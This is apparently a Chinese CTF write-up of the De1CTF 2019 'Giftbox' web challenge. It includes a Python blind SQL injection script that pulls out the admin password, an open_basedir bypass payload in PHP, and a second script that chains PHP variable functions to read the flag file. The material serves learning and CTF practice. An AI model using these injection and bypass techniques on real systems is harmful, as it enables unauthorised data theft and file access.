---
title: '[De1CTF 2019]Giftbox'
date: 2024-12-08 21:14:00
tags:
      - php特性

categories: 刷题笔记
---

## [De1CTF 2019]Giftbox

我们打开靶机，看到一个网页上的Shell

![image-20241209193325675](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412091933036.png)

提示我们输入help可以获得help，我们来看看

![image-20241209193404349](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412091934450.png)

我们发现有几个命令，我们看一下都能干啥

![img](https://www.zhaoj.in/wp-content/uploads/2019/08/15651499134e04718931d6b08b990c08a149fa5ccd-1024x947.png)

下面的login里有几个命令，我们试了一下发现其他几个要登录

![image-20241209193758720](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412091937813.png)

我们试着用login命令登录看看。测试一下发现在用户名那里有注入点，可以根据回显进行布尔盲注

![img](https://www.zhaoj.in/wp-content/uploads/2019/08/1565150217a6168e3b2d416cb28e00386600e147f7-1024x251.png)

写exp之前还需要看看是怎么和服务器通讯的，我们抓包看看

![image-20241209194209034](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412091942095.png)

我们发现a参数用来执行命令，totp参数似乎随时间进行变化，我们需要真的它是怎么运行的

在/js/main.js里可以看到这个提示，还有totp的令牌怎么生成的

![image-20241209194525027](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412091945061.png)

我们也拿到了令牌

![image-20241209194551903](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412091945937.png)

我们进行sql盲注

```
import requests
import pyotp
from time import  sleep
import re

url = "http://80965cc9-78d4-4bec-83f6-ec550345fe26.node4.buuoj.cn:81/shell.php"
totp = pyotp.TOTP('GAXG24JTMZXGKZBU', 8, interval=5)
name = ""
i = 0
while True:
    sleep(0.5)
    head = 32
    tail = 127
    i += 1
    while (head < tail):
        mid = head + tail >> 1
        payload = "login admin'/**/and/**/(ascii(substr((select/**/concat(password)/**/from/**/users),%d,1))/**/>/**/%d)and/**/'1 admin" % (i, mid)

        params = {
            "a":payload,
            "totp":totp.now()
        }

        r = requests.post(url,params=params)
        if "password" in r.text:
            head = mid + 1
        else:
            tail = mid
    if head != 32:
        name += chr(head)
        print(name)
    else:
        break

```

![image-20241209200339031](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412092003274.png)

成功爆出密码，我们登录

![image-20241209200417669](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412092004733.png)

我们来试一下targeting，launch，destruct那几个命令

![img](https://www.zhaoj.in/wp-content/uploads/2019/08/1565151683aff446ce9331ef2cffa0f8929b971609.png)

似乎是一行一行执行命令的

然后我们发现targeting哪里似乎有点限制，我们来看看限制了啥

经过测试，我们发现targeting前面的code限制了两位

**![img](https://www.zhaoj.in/wp-content/uploads/2019/08/156515187657c6ee406f5fceba4512e9959d70cc4d.png)**

后面的position限制了十二位

![img](https://www.zhaoj.in/wp-content/uploads/2019/08/1565151942525d059f81f77d93034e871adf576db5.png)

code 和 position 也有过滤。

![img](https://www.zhaoj.in/wp-content/uploads/2019/08/156515216744ee95ee15232320f52307ab7a7dd870.png)

到这，我们来总结一下上面的命令

- targeting code position =>储存一条 $code = “position”;
- launch => 将上面 targeting 起来的 code 按照字典序跑一遍。
- destuct => 清空，恢复初始状态

我们利用PHP特性来写

![image-20241209203406770](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412092034820.png)

我们在网络返回的响应里得到了返回的内容

![image-20241209203917884](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412092039974.png)

然后我们来看看刚才那个 phpinfo 所返回的内容，由于 content-type 为 json 所以不好看，我们可以存到本地的一个 html 文件然后打开看。

![img](https://www.zhaoj.in/wp-content/uploads/2019/08/1565153260ba42bbad4bbd6aacc808e27d7cf6f873-1024x141.png)

我们可以看到有open_basedir，我们需要想办法绕过，可以利用 https://xz.aliyun.com/t/4720 的方法绕过。

绕过的 payload 如下。

```
chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));
```

然后我们写个exp来把这个 payload 打过去

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import time

import requests

import pyotp as pyotp

totp = pyotp.TOTP('GAXG24JTMZXGKZBU', 8, interval=5)

session = requests.session()


def login():
    time.sleep(0.5)

    r = session.get('http://web72.buuoj.cn/shell.php',
                    params={'a': 'login admin hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}', 'totp': totp.now()})

    return r.json()


def targeting(code, position):
    time.sleep(0.5)

    r = session.get('http://web72.buuoj.cn/shell.php', params={'a': 'targeting ' + code + ' ' + position, 'totp': totp.now()})

    return r.json()


def launch():
    time.sleep(0.5)

    r = session.get('http://web72.buuoj.cn/shell.php', params={'a': 'launch', 'totp': totp.now()})

    return r.text


def destuct():
    time.sleep(0.5)

    r = session.get('http://web72.buuoj.cn/shell.php', params={'a': 'destruct', 'totp': totp.now()})

    return r.json()


def main():
    login()
    destuct()
    targeting("a", "chdir")
    targeting("b", "img")
    targeting("c", "{$a($b)}")

    targeting("d", "ini_set")
    targeting("e", "open_basedir")
    targeting("f", "..")
    targeting("g", "{$d($e,$f)}")

    targeting("h", "{$a($f)}")
    targeting("i", "{$a($f)}")

    targeting("j", "Ly8v")
    targeting("k", "base64_")
    targeting("l", "decode")
    targeting("m", "$k$l")
    targeting("n", "{$m($j)}")
    targeting("o", "{$d($e,$n)}")

    targeting("p", "flag")
    targeting("q", "file_get")
    targeting("r", "_contents")
    targeting("s", "$q$r")

    targeting("t", "{$s($p)}")

    print(launch())


if __name__ == '__main__':
    main()
```

运行，在结果里看到flag



参考https://www.zhaoj.in/read-6170.html#0x03%E3%80%81Giftbox
